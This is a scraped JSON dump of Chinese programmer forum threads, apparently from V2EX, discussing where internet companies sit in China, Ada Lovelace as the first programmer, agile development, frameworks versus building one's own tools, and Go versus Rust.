重庆\r", "同程旅游：苏州\r", "天涯：海口", "it 之家不知道算不算 在青岛\r", "还有一些软件公司承包政府的项目、外包。", " 还有嘻哈~~~", " 杭州又被黑了", "很多北上广深的公司把开发部移到二线城市了，因为同样的程序员一线城市开口 20K 的在二三线城市也就 8-12K ，节约成本", "游戏，外包，灰产，批量建站", "二三线城市被黑的最惨其中一次。", "湖北有个 4 线城市有个公司专做私服,准确的说是专门通过一些手段拿到正在运营的网络游戏的源码,然后转卖.\r", "\r", "我在梦幻龙族 2(九合天下)还没开服的时候就看他们在卖服务端了...", "外包", "it 行业位置不重要啊，我五线小县城一样有互联网公司，做产品，靠产品收费盈利啊，无非就是比较难招人而已，在技术足够牛逼的情况下， 2 个人就能轻松撑起一个千万 pv ，几十万用户的产品，为何一定要跑一线支付高昂的成本？", "二三线城市一般是一些二三线互联网公司和一些传统的软件公司，后者估计大多靠政府、机关、企业等业务活。"]},
{"content": "", "reply": "79", "tittle": "好奇问问，有多少人不谷歌就知道第一个程序员是谁？", "comment": ["Ada 。知道了有什么用？", "知道的话涨工资？", "不谷歌还可以百度", "知道了就能进谷歌？", "Ada...\r", "这难度也就等同于高考数学第一道选择题", "沈从文?", "沙士比亚", "知道又有卵用。。。。", "伏羲吧，毕竟发明了二进制。", "比尔盖茨", "亚当和夏娃", "ada 伟大的女程序员，然后呢？", "艾达。读高中就知道了，因为在他爹的介绍里看到过。而且，这位祖师奶奶的爵位比他爹还高点~~~\r", "\r", "然而，知道这个有何用处？\r", "美国空军搞过一种名为 ADA 的计算机语言，写飞行控制系统，似乎有祈祷祖师奶奶保佑之意。不过一样还是发生过发动机空中停车的 bug......\r", "\r", "好吧，我的祖师爷其实不是艾达，而是孟德尔，种豌豆的那位！", "不应该是 19 世纪用那种可编程织布机织布的女人们么:)\r", "外星人算人么？", "Ada 嘛，还有一种语言以她命名的，虽然我没 Google ，但是很早的电脑杂志上就介绍过了，当时还没有 Google", "Ada ， 她爹 是诗人拜伦", "知道蜗牛是怎么交配的吗", "图灵吧，没有程序机器怎么跑😊", "😂我朋友", "“我知道这么多没卵用的知识，却还是不知道怎么让你喜欢我”——来自网易云音乐评论", "亚当和夏娃 可能是世界上最早发现 0 和 1 的人.", " 冯诺依曼吧，没有机器程序怎么跑😊", "女娲吧，毕竟女娲创造了人，归根结底还是女娲的劳动成果~", " 考试： 根据一下程序写出结果～～～～～", "Ada, 拜伦女儿", "在时间维度上，程序员这个词是否是不变的", "Ada 绿了", "盘古。", "然并卵╮(╯_╰)╭", "不知道怎么办，我一定是个假程序猿", "上次妇女节 Google 的小漫画中艾达也出现了", "Ada ，然并卵", "那楼主你知道中国第一个程序员是谁吗", "block", "宙斯", "佛大大，编好了唐僧取经路线。", "那第二第三是谁呢？研究各种第一和 b 站弹幕抢第一的有啥区别", "不知道...", "ada lovelace", "ada 是谁……", "是不是神盾局也因为这个，把那个人工智能叫做 ada 。。", "好奇问问，有多少人不百度就知道我？\r", "没错，我大概就是第一个就算谷歌了也不知道第一个程序员是谁，也不去关心八卦是谁，这都跟我没关系的人，请大家记住我，谢谢[滑稽]", " 我怀疑你是某个 LBS 游戏的受害者， 233", "郑智化的生日是哪一天？ 周星驰的身高是多少？  马化腾的 JJ 有多长？  \r", "知道这些有蛋用？", "知道也没用，下一题", "程序员从本质上来说就是算法的实现者。\r", "如果这个实现是针对 Turing Machine,或者更早的 Analytical Engine ，理论上第一个就是数学家 Ada 了。\r", "如果针对的是大脑处理器，那程序员就是将军、包工头、经理、教练等等，而且程序计算是分布式的、并行的、弹性伸缩的、自然智能的.......", "浓浓的天朝计算机课考试题的既视感\r", "\r", "世界上第一台电子计算机是______", "反正没比尔盖茨有名", "那个 喜欢赌博还是喝酒的那个女程序员？", "第一个 Computer （计算师）还是程序员（ Programmer ）？如果按照程序规划来说，应该在人类第一有顺序地安排一系列任务重复发生就可以算数，这样可以上溯大约几十万年到数百万年？", "NOI 预赛的题目里的确有过这种题\r", "\r", "Ada Lovelace ，诗人拜伦的女儿\r", "\r", "记得很清楚，不过是看一些奇闻逸事的文章知道的", "科班出身基本都能答出来的吧......另外, CSAPP , Code 还有哪怕是大学计算机基础的书都有讲过......知道的话确实也没什么用......但是如果不知道的话确实有点那个什么吧......", "ada 类似 plsql 的语法", "梅超风", "应该是 秦始皇", "block", "用过 ida 的肯定知道那个 icon 的意义", "知不知道，对我有什么影响？", "ada 是不是第一个程序员还是有争议的，因为她的 program 都是巴贝奇写的，巴贝奇的分析机都没研制出来， ada 怎么写程序啊。", "上条回复引自 wikipedia", " #41 IDA ICON 里的贵妇\r", "\r", " ", "ada\r", "这不是常识么？", "ada ，是她。初中就知道了。然而还是死在选择题上_(:з」∠)_", " jarvis 也快了", "此类问题应该是生活里最无聊的了。", "好奇问问，有多少人不知道谷歌第一个程序员是谁？", " 我也是第一眼看成谷歌的第一个程序员是谁？", "为什么你们初中就都做过这种选择题？难道我上的是假初中？", "第一次用 IDA Pro 甚至以为自己下错了…", "俺用 ada 的程序，哈哈。", "當然是上帝咯～ 而且還是只用 A.C.G.T. 直接寫底層", "ada\r", "大学选过计算机发展史这个野课", "拜伦的女儿呀", "楼主..被大家吓尿了...原来大家都知道..\r", "就我不知道...", " 这个还能开成一门课？", "那有人知道世界上第二个程序员是谁吗？", "r#56 @", " \r", "手办控是甲方吧。", "我以为是不谷歌就知道的程序员是谁？所以给比尔·盖茨投一票"]},
{"content": "", "reply": "目前尚无回", "tittle": " 挂了吗?", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>分享一篇鹅厂老司机的开发经验，你不得不看</p>\n<p><a href=\"https://www.qcloud.com/community/article/382005001489731581?fromSource=gwzcw.57411.57411.57411\" rel=\"nofollow\">做开发十年，我总结出了这些开发经验</a></p>\n</div></div>"], "reply": "3", "tittle": "鹅厂老司机：做开发十年，我总结出了这些开发经验", "comment": ["“有一次开会，产品拿出 Google 某个产品的 DEMO ，里面有一段很酷炫 3D 效果，要求开发加上，只给 2 天时间，大家目瞪口呆”\r", "\r", "联想了一下 刘超", "...百度浏览器团队...\r", "....然后我也急忙离职了。。。。实在看不到成功的可能性。\r", "\r", "笑出声，难怪百度产品那么烂", "很有意思"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>就是那种把调用的信息存在数据库里，要调用的时候去取，根据请求响应的信息，发送请求并解析响应，以后要调任何的接口只需要在数据库里配上信息，不需要改代码就可以调新的接口。我老师让我弄这个，水平一般感觉这东西还不太好弄...</p>\n</div></div>"], "reply": "2", "tittle": "你们那有通用的 httpclient 吗", "comment": ["guzzlehttp?", "graphql ?"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>阿里巴巴实习生内推</p>\n<ol>\n<li>必须为 2018 届应届生</li>\n<li>职位方向：算法工程师、研发工程师、数据研发工程师、前端开发工程师、测试开发工程师、客户端开发工程师</li>\n<li>原则上优先推 B2B 国际站部门</li>\n<li>具体的看 <a href=\"https://campus.alibaba.com/index.htm\" rel=\"nofollow\">https://campus.alibaba.com/index.htm</a></li>\n<li>姓名、邮箱、手机号、简历发邮箱： zekun.yzk@alibaba<a href=\"http://-inc.com\" rel=\"nofollow\">-inc.com</a></li>\n</ol>\n</div></div>"], "reply": "1", "tittle": "阿里巴巴 2018 届应届生实习内推", "comment": ["没有安全部门吗？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>连框架都算不上,就一个简单的目录结构,编程语言使用的是 python, 服务器用了 tornado, api 返回格式是 json</p>\n<p>Github 地址: <a href=\"https://github.com/xiaojieluo/api_template\" rel=\"nofollow\">https://github.com/xiaojieluo/api_template</a></p>\n<p>求 star...</p>\n<h2>安装</h2>\n<pre><code>git clone https://github.com/xiaojieluo/api_template.git\npip install -r requirements.txt\npython main.py\n</code></pre>\n<h2>使用</h2>\n<p>默认端口是 8888\n浏览器直接打开 localhost:8888/</p>\n</div></div>"], "reply": "8", "tittle": "没事撸了个 api 的快速开发模板", "comment": ["我的天", "```python\r", "#!/usr/bin/env python\r", "# codin=utf-8\r", "```\r", "\r", "main.py 里这个没写错？", " 同意， python3 里已经不需要定义字符编码了", "不明其所述", "好厉害哦！", "#!/usr/bin/env python\r", "# coding=utf-8\r", "\r", "from api.handler.APIHandler import APIHandler\r", "\r", "class index(APIHandler):\r", "    def get(self, username):\r", "        data = {\r", "            \"name\":username\r", "        }\r", "        self.write_json(data)\r", "\r", "\r", "你在逗我？这算什么模板。", " 写快了漏掉了...", " 这只是组织了一下目录结构啊,小玩意"]},
{"content": ["<div class=\"topic_content\">echo \"xxxx\" &gt; ~/.zshrc\r<br>傻比了，少打了一个&gt;</div>"], "reply": "1", "tittle": "不小心覆盖了.zshrc，怎么恢复", "comment": ["太不厚道，把我放到那么后面"]},
{"content": ["<div class=\"topic_content\">一个外行，想要走入程序员之路，需要多久？需要哪些步骤？</div>"], "reply": "6", "tittle": "外行怎么走入程序员之路？", "comment": ["要是有钱，谁 TM 当程序员啊", "步骤:\r", "掌握一门编程语言\r", "找一份程序员的工作\r", "时间:\r", "因人而异", "里面的人想出来，外面的人想进去", "报班。", "  与我们一起学吧\r", "\r", "有问题可以加我们的群问，这样效率更高，这个群是一群工程师组建的面向初学者的 \r", "Python Linux 学习群， qq 群号： 278529278 ， \r", "Php Linux 学习群， qq 群号： 476648701 ， \r", "非商业性质，拒绝广告，只接收真正想学这方面技术的朋友，交流学习，申请请说明来自 v2ex", "现在程序员还有内行的么，什么专业来的都有，我就是会计专业"]},
{"content": ["<div class=\"topic_content\">具体，你司使用敏捷的哪种实现方式？ Scrum 还是 XP 还是其它等等？觉得有效果吗，真的提高了生产率？</div>"], "reply": "16", "tittle": "各位，你们觉得敏捷（ Agile）开发模式有用吗？", "comment": ["可能确实在某些方面有点用，更多的时候沦为教条", "正在经历沦为教条。。", "Scrum …教条+1", "压榨程序员生产力。", "敏捷开发就是程序员写一堆没有用的代码", "以前有个同事直接改线上代码，还不提交到库里，美其名曰敏捷", "最开始是敏捷，后来大家水平参差不齐，没法敏捷了， 就普通的增量开发", "个人理解， Agile 不是用来压榨个人工作效率的。而是把团队协作中影响效率的部分剔除掉。\r", "Scrum Master 要做的不是让每个人按照某种统一的模式工作。而是发现和理解每个人的不同，从而制定并执行更有效的协作方式。", "理念很好，然而最后沦为加班", "我们用 scrum 和 kanban 挺有用的 不过真正做到百分百真正使用 scrum 的很少，很多都是大体拿来用 各种套用自己的“方式” 其实不是在用 scrum", "精益 敏捷， ThoughtWorks 更有发言权", "好的敏捷可以提高生产力 但是更多的敏捷=加班+不测试", "教条+1, 代码没写多少, 代码之外的破事儿更多了", "变相", " 变相加班", "基本上沦为教条，在业界正在变成压榨程序员的正当借口！ Daily Standup Meeting 变成向领导每日汇报，因为每日会议，不得不每天加班赶进度。抱怨投诉无门，分分钟让你走人。这就是敏捷的现状，全球的软件工业都一个鸟样！跟印度和美国的同事聊过，亲耳听过他们的抱怨！"]},
{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"https://wx.xiaomiquan.com/mweb/views/topicdetail/topicdetail.html?topic_id=458114525428&amp;secret=uuk858wu9al67a93ac62oeu9k74082n2\" rel=\"nofollow\">https://wx.xiaomiquan.com/mweb/views/topicdetail/topicdetail.html?topic_id=458114525428&amp;secret=uuk858wu9al67a93ac62oeu9k74082n2</a></div>"], "reply": "2", "tittle": "帮朋友找 ROR 工程师，远程办公", "comment": ["靠谱吗?请务必做正经项目", " 应该靠谱吧。我朋友在里边也对一些网友作了解答。不知道是不是他自己的项目，如果是的话，靠谱。我跟他合作过几次。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>不用框架，只用基础类库（操作字符串啊，解析 json ，解析各种 XXX ）造一些显而易见的轮子。</p>\n<p>一句话总结，我可能是个假程序员。</p>\n<p>各种名词朗朗上口，各种概念如数家珍。但真要自己去实现。哪怕是一个很简单的轮子，投入的精力相当可怕。各种细节必须要考虑在内。平常只是实现业务逻辑，相比而言差别太大了。业务逻辑的细节是有限的，轮子的细节是无限的。\n对开源贡献者油然的有一种敬佩之情。</p>\n<p>我想，如果没有生产效率的考虑，用框架是否是自己作死。工作 3 年和工作 1 年完全没区别啊。。。最少我身边的朋友没几个去翻框架里的源码。更别说造轮子了。</p>\n<p>下次再有人问我如何提高水平，我想我的答案一定是去造个最简单的轮子，哪怕只是写文件。框架用多了会有后遗症。</p>\n<p>尽量别用框架。。。用框架代表的是生产力，而不是脚踏实地的能力。</p>\n<p>这个能力很玄学，我的意思就是正儿八经的自尊感。</p>\n<p>所以，最近 js 界如雨后春笋一般的轮子冒出来。以前是觉得很装逼，现在觉得这群人愿意投入自己额外的时间。光这一点就值得人佩服。</p>\n<p>程序界的键盘侠也是多如牛毛的啊。</p>\n<p>不喜欢用自己熟悉的语言去做轮子的，尤其是已经有成熟的方案了。会有挫败感。。脑子里会一直飘着：“你是个 SB ，你是个 SB ，你是个 SB 。。。”</p>\n<p>所以就用所谓的新语言咯。顺便学习点新的技术做技术存储，多一样技能傍身没坏处。</p>\n<p>于是乎\n试着用 go 做，发现 golang 语法确实很恼火。除非工作需要，我想我不会再碰这个东西。。</p>\n<p>再试试 rust 做，好东西啊，可惜没个好爹。</p>\n<p>so ，是要提升自身的能力，还是生产力？这是个问题。。。</p>\n<p>以现在这个社会的社会导向而言，生产力代表了来钱，那就选生产力。然后转管理，然后再不碰代码。。</p>\n<p>前不久的那个一毛钱没拿的“ CTO ”就是个典型，我看了给我的感觉就是我草，再不学习被 t 了连饭碗都没了。。只能靠吹牛逼活着，这就是忘了做程序员的初心了啊。</p>\n<p>当初为什么要做程序员呢？第一是生存，第二是可笑的理想。现在好像只为了赶紧存首付，生娃，结婚。</p>\n<p>刚过完 30 生日的大叔月经吐槽，因为是双鱼的，所以有时候特别感性。。。思考我这个假的人生。。</p>\n<p>Freedom ！！！！！然并卵。。</p>\n</div></div>"], "reply": "71", "tittle": "我可能是个假的程序员", "comment": ["Just for fun", "我会造轮子，但是还是倾向于用框架。造轮子是为了了解原理，使用框架是为了交接方便以及持续的版本迭代。个人轮子肯定不够大众轮子长寿。", "用框架代表的是生产力，而不是脚踏实地的能力。", "个人项目，个人兴趣，可以造轮子，可以了解底层逻辑，提升技术\r", "公司项目需要用到框架还是老老实实框架吧", "楼主把自己造的轮子贴出来看看呗", "突然想到那句：“ 20 岁写不出 Linux ， 50 岁也写不出”……那么，多年工作经验是否是个伪命题？", " 这句话说的确实是这么个意思\r", "\r", " 特别简单的轮子，就不贴了。自己写着玩的。。\r", "\r", " 是这么个道理。。。公司项目还是公司要什么提供什么。。。\r", " 使用框架我的感觉纯粹是为了工资。。。因为不用框架要几个月，用框架只需要几个小时。这代表了你会不会被淘汰掉。。当然，有自己稳定的轮子，这个就看 leader 怎么看了。仁者见仁智者见智。", "框架也不是人人都能用好的。。实际上用不好的人更多", " 讨论的并不是框架好不好用这个问题。。。我想吐槽的是。。。脚踏实地感。存在即合理。。。公司项目不用框架不是作死么。。。", "其实还有一个故事：\r", "如果你的 leader 告诉你，你有 N 个月时间做一件事。你可以自由选择自己做或者用现成的解决方案。 N >= 3.\r", "大家伙怎么选？", "写 C++呗，一般搞这个的，框架都是自己人做的吧\r", "感觉我逛 GitHub 也没见过多少出名的 C++框架。", "楼主， go 的语法让你恼火？你确定不是 rust 么", "就是因为想太多得失心太强你才不能变强\r", "有什么想法就赶紧去做，老是想这想那只会对任何事情都望而却步 — 最后一事无成", "都是工具而已，谁关心。", "造框架轮子和造工具类库轮子是不一样的概念。能写出 lodash/ramda/underscore 之类工具的人未必能创造得出 backbone/angular/react", "取决于你想做什么，这个世界没有绝对的事情。如果想把程序水平提高，那就要多研究学习别人的代码。如果只是想快点做完事情，用封装好的更好，留下时间可以做更多有意义的事情。\r", "\r", "一切取决于你认为什么是值得的和重要的。", "有个问题 楼主你自己写的框架你自己用么？\r", "\r", "用 那楼主為什麼排斥框架\r", "不用 那你造轮子干嘛\r", "\r", "...", "作为人类，你会反对使用工具吗，认为工具只代表生产力，不代表能力吗？\r", "\r", "作为程序员，可以不用框架，那是不是语言也应该自己写，指令集也自己设计？\r", "\r", "在当今世界，几乎所有专业都与计算机息息相关。但是，只有某些特定职业和学科才会深入研究计算机本身的制造、编程和使用技术，而程序员在其中的作用，是更快更好地为人类生活带去便利，如果你不认可这一现实，应该去从事科学研究，而不是生产应用。", "这么说吧，大部分人造轮子造出来的都是废轮子，可能就没人用。如果大家都去造轮子，其实是很大的资源浪费，就像优化代码，写 C++的时候强行插入内联汇编，可能还不如不折腾直接让编译器优化的好，编译器的优化策略都是大牛折腾出来的。\r", "我觉得读大牛们的源码更有效吧，当然肯定也少不了自己的练习，造点小轮子啥的。\r", "如果日常生活中碰到个人对自己平时所用工具、框架的源码了如指掌，那已经很牛了吧。\r", "\r", "用框架，有些人做久了把 API 背下来了，充其量是个熟练工，那种就不行了。", "即使是造轮子，也避免不了用到别的轮子的。\r", "\r", "一个人的价值体现在，你解决了什么问题。合理地使用工具，解决你要解决的问题再正常不过了。\r", "\r", "已经存在的轮子，你再做一个出来，这只能说明你是一个合格的学生。能够使用工具解决真正的问题，才是工程师要做的事。\r", "\r", "你照着别的轮子做一个出来并不会让你变得像原作者一样厉害。框架作者的价值在于，以前人们不是这么做项目的，他想到了一种好的做项目方式，得到了人们的认同，他的价值在于他提出了这种思想。\r", "\r", "在实践中各种各样的轮子用的多了，了解各种轮子的优点和不足，才有机会想到，在软件开发中还有哪些问题需要解决，我们现在还缺乏什么样的轮子，才能造出有意义的轮子。", "上次公司硬件部门跟我说个需求，我第一反应竟然是“没有这个 API ”......", " +1", "lz 造过哪些有意思的轮子, 开个贴分享下呗", "轮子是很好的东西, 感觉楼主还不算是一个假程序猿,我才是如假包换的. 入行也有些年月了,现在才来学习框架这些基础的东西, 入行这么多年就迷茫了这么多年, 现在什么东西都学了一点 但是又感觉自己什么都不精通. 什么东西说起来可能朗朗上口, 但是真正实操起来, 又感觉好像哪里都说不上来的别扭..  最近算是想明白了,  设计和开发应该才是我的人生追求, 看着市面上那些琳琅满目的产品, 一件件优秀的设计出来的硬件软件, 我觉得那里才说我的归属 . 现在准备一步步踏入这个领域.. 感觉自己当了好多年的假程序猿了, 与君共勉.", "有谁来用 C++ 写 web ？", "> 于是乎 试着用 go 做，发现 golang 语法确实很恼火。除非工作需要，我想我不会再碰这个东西。。\r", "\r", "为什么要黑 golang ？", "golang 的语法挺简单的啊", "看定位，是想成为铸剑师？还是剑客？", " 我的意思就是大家都用框架，也能体现出能力的不同。何况用框架怎么就不脚踏实地了。要不要用汇编。。", "计算机行业和建筑行业在本质上其实没有什么区别，\r", "建筑行业和计算机行业都是那么一群人，而建筑行业各个人之间的分工可以说是硬区分，\r", "只是计算机行业不同人之间的界限往往不是那么清楚的，我觉得可以说是软区分，\r", "比如架构师， CTO ，普通程序员，", " 没编辑完...不小心发送了\r", "计算机行业人与人定位区分很软，所以势必导致界限模糊，\r", "用框架用轮子也没什么不好，建筑行业就是那些建材不容易自己造，\r", "所以区分度高，分工明确，软件呢，每个人都有机会写框架造轮子", "你说的都很有道理，但是为什么要黑 go", "从杂质中提取出铁，造成锤子，用锤子造出简陋的工具，用简陋的工具造出复杂的工具，用复杂的工具生产出能改善生活的商品。\r", "\r", "代码也一样，前人抽象出更高一层的工具被新的程序员继承，进行更高层次的抽象，代码的巴别塔才能越修越高。\r", "\r", "人类出生以后需要学习已有的所有前置知识，一样的过程要被无数人实现无数次才能往前迈一点点，牛顿说自己站在巨人的肩膀上，那也是他自己爬上去的。\r", "\r", "但是封装良好的程序，让程序员可以真正的生下来就在巨人的肩膀上，而不用从写二进制代码开始。", "很同意 28 楼的观点。\r", "\r", "前段时间纠结一个类似问题，一个好的项目还是一个赚钱的项目，就是个定位的问题。\r", "\r", "所以还是看自己定位吧。", "要么用轮子做应用, 要么专心开发轮子, 一边做应用同时造轮子. 很有可能轮子转不好, 应用也跑得不欢快", "应该从炼硅开始吧。", "我也有楼主的困惑，同样也我也正好 30 ，知道越多，懂得越少，我今天也真正理解了这句话。前段时间也试着做了一个源码分析的项目，希望大家共同参与做源码的分析，但是可惜响应的人也太少，我把帖子链接贴到这里大家共勉。\r", "没有用的，绝大部分公司要的是生产力 而不是 技术研究，资本是用来赚钱的，不是用来研究技术的\r", "\r", "--------------------------\r", "我以前做过一段时间的机械加工，就是机械工厂那种流水线式的生产，完全照着图纸加工，\r", "基本上是机械式的装夹，然后按下按钮 机器完成加工工序\r", "（不要问我为什么，我是机械狗毕业，为什么不去当画图狗？因为垃圾本科毕业，画图都没人要）\r", "\r", "这种工作别说 34 岁，基本上 30 都干不到，富士康内部每年一大把一大把的招聘 中专 大专毕业生干这个，\r", "好多都是 18-28 岁的年轻人， 30+的基本上看不到，\r", "\r", "而且年轻人精力旺盛，加班到 12 点 来个三班倒  基本上是无压力的，程序员加的那点班 说实话真不算什么\r", "而且这种机械式的加工的职业，是没有任何职业成长出路的\r", "\r", "随着智能技术 以及计算机技术的出现，这种岗位的出路越来越少，\r", "以前还有好多老师傅还会吹嘘 自己加工的精度比计算机还牛逼，随着计算机技术的发展，狠狠的被打了一波脸\r", "\r", "最早很多加工领域  需要工人来保证精度 只有非常牛逼的加工人员 凭借过往的经验来保证的，但是随着技术的发展\r", " 人的重要性慢慢被替代了   机器唯一不能代替人的地方   复杂的装夹动作 以及对图纸工序的理解了\r", "\r", "---------------------------\r", "程序员的工作本质也是一样的，绝大部分的岗位注定是   理解业务->编写业务代码\r", "早期由于计算机性能等限制，程序员需要非常好的计算机知识等功底才能编写出能用的代码，\r", "到今天这种情况，对于一个规模不大的问题， O(N3) 跟 O(logN)的实现 又有多大的区别呢？\r", "再慢一点，也就泡杯咖啡的时间就解决了\r", "\r", "同其它各行各业的工程师一样，绝大部分工程师 都是解决技术世界最后一公里的问题 ，\r", "\r", "程序员跟软件工程师 需要解决的问题就是\r", "\r", "具体业务->到通用计算机实现代码实现的问题", "楼主认为造轮子的程序员才是真的，用轮子的都是假的么？", " #39 分工不同而已", "记得之前听过一句话：大多数行业，都是最顶尖的那不到 1%的人研究最前沿技术，指定规则，生产工具。而剩下的 99%的人需要的只是遵守规则，约学会怎么使用那些工具。编程行业也是如此吧，不到 1%的人完成了纯技术研究 99%的工作。", "感觉存在一个误区，程序员和计算机科学家之间的概念区分。\r", "或者说是工程向和科研向的概念区分。\r", "————————————————\r", "作为程序员或者软件工程师，乃至架构师，我们首要的目的是解决实际成产中的问题。\r", "框架和轮子都是这个解决问题的过程中产生的。\r", "框架和轮子不是为了造而造的。\r", "————————————————\r", "作为一个工程师，我们首先想到的就是如何解决问题，就如同其他行业的传统工程师一样。\r", "譬如建筑工程师，机电工程师，电子工程师等等，我们和他们没有本质区别。我们不需要主力去研发什么高达上的架构或者算法。我们的着重点是如何使用现有的技术完成我们对面的需求问题，当现行技术无法完成的时候，我们要想办法去完成。\r", "\r", "而不是为了实践什么自尊或者个人价值去做什么高达上的框架或者轮子。\r", "————————————————\r", "我们就是工程师，或许很平凡。", "另外，我上面这番话只是针对这个职业本身来讲的。\r", "\r", "除了职业以外，还有一个东西——兴趣。\r", "兴趣内容和工作内容绝对不会一样，而且是 100%不会一样，除非你是一个艺术家……\r", "当兴趣变成职业的时候就是一种悲哀。", "我也是用楼主类似的假程序员，系统用框架。懒得看源码，真要源码来写，真的要命。", "你的想法很危险啊大叔，但愿我们不要成为同事吧 = =", " \r", " \r", "说的很好，深有同感\r", "\r", " 知道得越多，就像窥探到不得了的东西。原来自己无论如何都是 sb …\r", " 没黑 go …就是说着说着突然想吐槽一下。", " 对，你不觉得这种直觉很可怕吗？一个工程师应该是想到的是能不能解决。没有 api 就解决不了了？", "不要重复制造轮子\r", "强调 重复\r", "\r", "如果还没造过\r", "谈何重复\r", "\r", "其实是在教导我们不管什么轮子\r", "自己先造个试试", "别想这么多了，自己过好每一天，少加班，有钱拿，多陪陪家人才是真的，不然其它的一切都是了解无物的，才 30 岁而立，到 40 不惑的时候你回首能看到的只有曾经自己的所得，不是你用什么框架，不是你技术多厉害，更不是你为这个开源社区做过什么，没有人会在意你的，真的", "你不也说了吗，生产用框架效率会高很多，如果你想提升自己，比如去学学英语？提示自己的情趣爱好也是对自身的一种提升，", "不妨我们先写个编译器吧？", "造轮子浪费生命", "理解业务->编写业务代码 ,你的代码是能准确执行出结果就满足要求了吗; \r", "\r", "我认为,到这里还远远没有结束; \r", "\r", "我有机会就会在公司倡导一个观念, 怎么把代码写的优雅, 当成一个艺术品来看待; \r", "\r", "怎么样更便于阅读, 怎么样更易于维护, 怎么处理能在后续版本迭代过程中, 尽量容易修改而又不过度设计;  \r", "\r", "在我看来这是最重要的能力体现,也是学校学不来的;", "想财务自由不容易啊", "有句话叫站在巨人的肩膀上，毕竟现代人也能像原始人一样生活，可到底原始人已经不见了", "来个简单的，先实现一套逻辑门电路？", "Golang Rust 的一点小小看法\r", "\r", "在我眼里， Golang 之于 C ， Rust 之于 CPP 。\r", "\r", "我很喜欢 Rust ，无论是变量命名方法，语法等等，奈何学习起来陡峭得飞起。写起来各种不顺手，过度强调安全性导致严重失去了易用性\r", "Golang 是我对 Rust 无可奈何之后学习的语言。给我的感觉就如同当时同时学 C 和 CPP 那样（ CPP 写起来炒鸡不舒服， C 就很 nice ）， golang 在保证一定安全性的情况下实现了易用性，写起来舒畅无比。\r", "\r", "当然了， Rust 的生命周期，所有权，借用等等 都是无比吸引人的，再加上 循环中可以用标签的形式跳出。 等等很多没有历史包袱的语法糖和特性，想想都很动人。\r", "\r", "不可否认的是， Rust 存在了过度设计的无奈， 抛弃了 指针， 但是在工程中又要使用怎么办， Box Cow 来帮你搞定。 str String 的区别，新手估计要搞好久才能搞懂哪里该用 str 和 String 。 str 传递的时候各种取值符什么的。真的难受\r", "\r", "虽说 Rust 是冲着 CPP 去的，私以为，还是设计得太过度了。 从 CPP 转移过来的代价太大。\r", "\r", "Rust 相比 Golang 还有不少优点：\r", "\r", "Crates.io 和 cargo 比 Golang 的 go 优秀带多了。\r", "\r", "docs.rs 文档很全，但是不太适合新手入门。因为 cargo 内置了生成文档的功能，导致开发者写库的时候都不太习惯写 入门使用， 懒得飞起\r", "\r", "\r", "\r", "两者都可以实现交叉编译，都可以做到零支持运行。 都有自动类型推导。 在我看来都是可以学习的语言。\r", "\r", "\r", "写 Rust 的感受就是： F**K ，这 TM 也报错；我擦，这里能有什么错\r", "\r", "写 Golang 的感受： 咦，这样写居然通过编译了？", " 我的 ID 诶 （逃", "造轮子不重要\r", "\r", "重要的是能造轮子", "这就跟你做饭一样，难道要钻木取火吗，难道所有食材都需要自己种植吗，如果下面这些都有人接管了， 你只负责做好你的菜。别人也不会因为菜不是你种的就否认你的技能呀。", "现在程序员不断造轮子还开源出来.除了在简历上炫耀自己的技能,能真的\"改变世界\"么.\r", "(我指的是那种小范围使用的小轮子,不是各种知名开源项目.)\r", "这种轮子最终作用不过是小范围内提高同行人生产力而已.\r", "结果是效率高了,工作时间并没有减少.\r", "甚至这些同行因为使用这些轮子实际能力下降了.怎么办?他们继续造各种所谓的轮子呗.\r", "这些轮子看起来很酷炫,但是可能真的害了我们.\r", "真是一个怪圈.", " 本来只是牢骚，既然你如此说。。我想说两句。\r", "其实不是这样的。。如果不用 unsafe 的一些灵活性技能，只是做业务开发。编译过了就一定没问题。这是核心特性。不想 go 或者其他的， tm 编译了我还要担心线上崩了", " 我的意思是太过度了。 没必要", "也要看轮子是否值得造。\r", "大多数时间公司也是需要应用别人造好的轮子解决商业问题而已，没必要真正去重新造轮子。", "1 造轮子（尝试） => 2 了解原理（学习） => 3 利用轮子(应用) => 4 解决问题 => 5 获得解决问题的经验和能力 => 6 通过能力挣钱 => 7 解决自己和家人的温饱及生活质量问题（活下去） => 8 做自己想做的事\r", "\r", "学校 /培训可以通过教授你别人已经动手得到的原理让你直达 2 ，大部分转行来的程序员 /没有好好学的科班出身程序员其实是直接从 3 切入。某部分职业可以直接从 4 切入。行业老手比新手的优势在于老手已经到达 6 ，新手还在 3 。大部分人活着是为了 7 ，但是不得不从 1 开始，而且有可能倒在 7 ，达到不了 8 。有钱人 /无所谓钱的人可以直达 8 。\r", "\r", "如果楼主乐于造轮子，享受造轮子的过程，那么你已经直达 8 了。问题在于，你在 8 ，但是你担心你的 7 不稳，所以焦虑。\r", "如果楼主不乐于造轮子，只是为了 3 造轮子，为了满足自己的完美主义强迫症，那么你得考虑是不是该顺着这条链往下推进，而不是在 1 和 2 之间徘徊了。", " 我倒是和你相反。写 c 总感觉不舒服，但是 cpp 写起来很 nice 。\r", "\r", "没学过 rust 。但是看过 go 。看了个基础语法就放弃了。以后除非有硬性要求目测是不会在学了。。。", "我想，如果没有生产效率的考虑，用框架是否是自己作死。工作 3 年和工作 1 年完全没区别啊。。。最少我身边的朋友没几个去翻框架里的源码。更别说造轮子了。\r", "\r", "↑↑↑↑↑↑↑↑\r", "呵呵，自己学艺不精才能说出来这种话。\r", "如果你把框架当做一种独立语言，你要按照该语言的规范做事，那么，你怎么看？\r", "\r", "大家都用一种语言，比如大家都用 java ，大牛和普通程序员写出来的代码质量都没法比，思路也没法比\r", "\r", "如果扩张到大家都用 SpringMVC 框架（大公司很常见从 50K 的到刚入职的 12K 的都在一线写代码） 高级开发和入门开发之间的鸿沟也是楼主的思维难以理解的", "老僧三十年前来参禅时，见山是山，见水是水；及至后来亲见知识，有个入处，见山不是山，见水不是水；而今得个体歇处，依然见山还是山，见水还是水。\r", "\r", "转一句老话。\r", "\r", "对于参透了的人，一段代码是不是被称之为轮子，有区别吗？", "代码本身重要?\r", "还是代码做出来的东西重要?", " \r", 